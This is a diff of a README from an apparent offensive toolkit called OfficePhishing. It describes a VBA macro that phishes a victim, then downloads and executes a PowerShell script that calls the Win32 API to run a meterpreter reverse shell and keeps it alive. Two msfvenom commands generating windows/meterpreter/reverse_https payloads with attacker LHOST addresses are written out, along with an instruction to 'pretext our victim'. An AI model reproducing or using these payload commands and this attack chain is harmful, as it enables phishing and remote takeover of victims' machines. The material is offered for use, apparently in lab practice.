@@ -2,6 +2,7 @@ Basic phishing to auto download our payload than auto execute using vba
 
 phish.vba
 
+
 Remember to pretext our victim
 ![image](https://github.com/VietTheBarbarian/OfficePhishing/assets/56415307/5683bbc3-0abb-40a1-9e22-69a2ce8f080f)
 
@@ -16,8 +17,8 @@ Will exit when you close office
 msfvenom -p  windows/meterpreter/reverse_https lhost=10.10.11.135 lport=443 EXITFUN=thread -f vbapplication
 
 
-run.ps1 and auto.vba
-using powershell to call win32 api to execute reverse shell
+run.ps1 and auto.vba(download and execute run.ps1 from word)
+using powershell to call win32 api to execute reverse shell 
 To prevent termination added wait forever 
 msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f ps1
 ![image](https://github.com/VietTheBarbarian/OfficePhishing/assets/56415307/16262bf9-823f-4ef6-a482-64ecb68ecbf8)
